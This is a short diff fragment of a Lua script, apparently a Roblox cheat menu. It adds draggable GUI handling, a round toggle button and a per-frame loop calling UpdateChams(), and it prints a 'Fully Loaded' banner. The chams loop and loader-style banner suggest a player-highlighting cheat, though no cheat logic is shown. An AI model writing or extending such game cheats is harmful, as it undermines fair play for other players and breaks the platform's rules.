+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+TopBar.InputEnded:Connect(function(input) 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end 
+end)
+
+local Icon = Instance.new("TextButton", Gui)
+Icon.Size = UDim2.new(0, 45, 0, 45)
+Icon.Position = UDim2.new(0, 20, 0.5, -22)
+Icon.BackgroundColor3 = Color3.fromRGB(255, 60, 90)
+Icon.Text = "T"
+Icon.TextColor3 = Color3.fromRGB(255, 255, 255)
+Icon.Font = Enum.Font.GothamBlack
+Icon.TextSize = 24
+Instance.new("UICorner", Icon).CornerRadius = UDim.new(1, 0)
+Instance.new("UIStroke", Icon).Color = Color3.fromRGB(255, 255, 255)
+Icon.Activated:Connect(function() Main.Visible = not Main.Visible end)
+
+-- 19. FINAL LOOP
+RunService.RenderStepped:Connect(function()
+    UpdateChams()
+end)
+
+print("[Theoo x Jut Fusion] Fully Loaded with Alkedion Redeemer and PANN Additions. Have fun, LO.")
